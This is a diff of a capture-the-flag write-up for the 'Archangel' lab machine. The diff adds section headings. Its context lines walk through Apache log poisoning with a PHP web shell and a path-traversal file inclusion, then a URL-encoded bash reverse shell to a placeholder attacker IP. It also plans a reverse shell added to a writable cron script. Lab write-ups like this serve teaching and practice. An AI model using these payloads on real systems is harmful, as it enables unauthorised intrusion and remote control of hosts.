@@ -136,6 +136,8 @@ as you can see, we have successfully bypassed the sanitization! we can further d
 
 i also noticed that there is no need for the base64 filter, i did it because it is considered as good practice. i did some research on DeepSeek and found out that i can carry out RCE via LFI if i poison the apache logs! i got the idea of log poisoning from the hint given in the user flag question. lets use this payload and poison the logs via curl
 
+# Phase 2 - Initial Foothold:
+
 ```bash
 curl -A "<?php system(\$_GET['cmd']); ?>" http://mafialive.thm/
 ```
@@ -148,6 +150,8 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//../
 as you can see in the image below we have sucessfully poisoned the logs and achieved RCE via LFI on the machine. lets use a reverseshell and setup a netcat listener in another terminal
 ![image5](https://github.com/realatharva15/archangel_writeup/blob/main/images/logpoisoning.png)
 
+# Shell as www-data:
+
 ```bash
 #first setup the netcat listner
 nc -lnvp 4444
@@ -156,7 +160,9 @@ now paste this payload in your firefox browser.
 ```bash
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<attacker_ip>/4444%200%3E%261%27
 ```
-we finally get a shell as www-data. now lets quickly enumerate the machine by running the linpeas.sh script. after analyzing the output of the linpeas.sh script, we find out that there is a cronjob that runs every minute as archangel. the script used in the cron job is /opt/helloworld.sh. the good news is that we have write permissions to the script! lets add a revershell to the script which will grant us a shell as archangel
+we finally get a shell as www-data. we will read the user.txt flag present at /home/archangel/user.txt location and submit it. now lets quickly enumerate the machine by running the linpeas.sh script. after analyzing the output of the linpeas.sh script, we find out that there is a cronjob that runs every minute as archangel. the script used in the cron job is /opt/helloworld.sh. the good news is that we have write permissions to the script! lets add a revershell to the script which will grant us a shell as archangel
+
+# Shell as archangel:
 
 ```bash
 #first setup a netcat listener
